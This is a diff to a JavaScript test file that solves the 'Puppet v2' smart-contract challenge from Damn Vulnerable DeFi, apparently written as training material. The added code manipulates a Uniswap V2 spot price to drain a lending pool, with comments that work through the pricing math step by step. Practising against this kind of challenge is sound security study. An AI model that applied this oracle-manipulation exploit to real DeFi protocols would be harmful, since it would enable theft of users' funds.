@@ -81,7 +81,104 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+      /** 
+      * @dev
+      * Hack: similar to Puppet v1: we manipulate the ETH/token ratio of the AMM liquidity pool to be able to borrow all the DVT funds of the lending pool.
+      * The main difference is the use of Uniswap V2 here, which uses WETH to allow for direct transfer between ERC20 tokens. This just means an extra step of swapping some of our ETH to WETH before borrowing the DVT.
+      * Method:
+      * 
+      * 1- swap some of our DVT for WETH in the Uniswap pool => this will shift the spot price of the DVT/WETH pair
+      * The UniswapV2 swap price model is as follow:
+      * TOKEN2_RECEIVED = 997*DEPOSITED TOKEN1*TOKEN2_RESERVE / (TOKEN1_RESERVE*1000 + 997*DEPOSITED TOKEN1)
+      * If we deposit 10000DVT:
+      * ETH_RECEIVED = 997 * 10,000 *10 / (100 * 1000 + 997 * 10,000) ~= 9.90069 WETH
+      * 
+      * 2- After our swap, the DVT/WETH ratio in the pool is now:
+      * 1 DVT ~= ((10 - 9.90069)/10100) ETH
+      *   Calling the price oracle from the lending pool to check what deposit is required to borrow all the DVT funds in the pool:
+      * DEPOSIT_REQUIRED ~= ((10 - 9.90069)/10100) * 1,000,000 * 3 ~= 29.496 WETH
+      * Given that we already have 9.9WETH from our swap done beforehand, we simply need to swap 19.6ETH against some WETH to be able to request the loan
+      * 
+      * 3- Borrow all the DVT tokens from the lending pool       
+      */
+      await this.token
+        .connect(attacker)
+        .approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+      const logBalanceDVT = async (_address, name) => {
+        const _balance = await this.token.balanceOf(_address);
+        const reserves = await this.uniswapExchange.getReserves();
+        const _balanceWETH = await this.weth.balanceOf(_address);
+        const _balanceETHUni = await ethers.provider.getBalance(
+          this.uniswapExchange.address
+        );
+        const _priceBorrow =
+          await this.lendingPool.calculateDepositOfWETHRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+          );
+        console.log(
+          `\u001b[1;33mDVT Balance of Uniswap:`,
+          ethers.utils.formatEther(reserves._reserve0)
+        );
+        console.log(
+          `WETH Balance of Uniswap:`,
+          ethers.utils.formatEther(reserves._reserve1)
+        );
+        console.log(
+          `DVT Balance of ${name}:`,
+          ethers.utils.formatEther(_balance)
+        );
+        console.log(
+          `WETH Balance of ${name}:`,
+          ethers.utils.formatEther(_balanceWETH)
+        );
+        console.log(
+          `\u001b[1;36mTo drain the funds, you need to deposit:`,
+          ethers.utils.formatEther(_priceBorrow),
+          `WETH`
+        );
+        console.log('');
+      };
+
+      await logBalanceDVT(attacker.address, 'attacker');
+      console.log(
+        '\u001b[1;35mSwapping all our DVT against WETH in the UNIswap pool'
+      );
+
+      await this.uniswapRouter
+        .connect(attacker)
+        .swapExactTokensForTokens(
+          ATTACKER_INITIAL_TOKEN_BALANCE,
+          ethers.utils.parseEther('9.9'),
+          [this.token.address, this.weth.address],
+          attacker.address,
+          (await ethers.provider.getBlock('latest')).timestamp * 2
+        );
+
+      await logBalanceDVT(attacker.address, 'attacker');
+      console.log(
+        '\u001b[1;35mExchanging our ETH against WETH in the WETH contract - making sure we keep some for gas'
+      );
+      await attacker.sendTransaction({
+        to: this.weth.address,
+        value: ethers.utils.parseEther('19.6'),
+      });
+      await logBalanceDVT(attacker.address, 'attacker');
+
+      console.log('\u001b[1;35mBorrowing all the funds of the pool: we need to deposit the amount of WETH specified on the log above');
+      await this.weth
+        .connect(attacker)
+        .approve(this.lendingPool.address, ethers.utils.parseEther('29.5'));
+      await this.lendingPool
+        .connect(attacker)
+        .borrow(POOL_INITIAL_TOKEN_BALANCE);
+      console.log(
+        `\u001b[1;33mDVTBalance of attacker:`,
+        ethers.utils.formatEther(await this.token.balanceOf(attacker.address))
+      );
+      
+
+      /** CODE YOUR EXPLOIT HERE */
     });
 
     after(async function () {
